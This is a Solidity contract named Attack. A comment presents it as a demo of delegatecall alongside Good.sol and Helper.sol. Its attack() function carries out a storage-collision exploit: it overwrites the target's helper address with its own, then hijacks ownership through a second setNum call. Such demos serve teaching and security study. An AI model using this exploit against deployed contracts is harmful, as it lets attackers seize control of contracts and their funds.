//SPDX-License-Identifier: MIT
//@dev this contract is used with Good.sol and Helper.sol to show the usage of delegateCall
pragma solidity ^0.8.10;

import "./good.sol";

contract Attack {
    address public helper;
    address public owner;
    uint public num;
    
    //inc=stance of contract Good.sol
    Good public good;
    constructor(Good _good) {
        good = Good(_good);        
    }

    function setNum(uint _num) public {
        owner = msg.sender;
    }

    function attack() public {
        //typecast an address to uint
        good.setNum(uint(uint160(address(this))));
        good.setNum(1);
    }
}

